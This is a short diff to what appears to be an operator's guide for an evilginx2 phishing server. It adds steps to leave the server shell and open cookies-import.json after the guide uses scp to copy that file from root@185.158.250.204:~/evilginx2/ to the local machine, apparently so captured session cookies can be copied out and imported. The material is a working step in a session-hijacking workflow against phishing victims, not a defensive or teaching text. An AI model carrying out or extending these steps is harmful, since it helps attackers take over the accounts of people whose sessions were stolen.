@@ -1032,8 +1032,10 @@ The file is a JSON **array** — it must start with `[` and end with `]`. Select
 **Route A (safest).** In Windows Command Prompt:
 
 ```
+exit from the linux ssh ubuntu or debian server for evilginx and use your normal terminal cmd
 cd %USERPROFILE%\Downloads
 scp root@185.158.250.204:~/evilginx2/cookies-import.json .
+notepad cookies-import.json
 ```
 
 Open in Notepad → `Ctrl+A` → `Ctrl+C`.
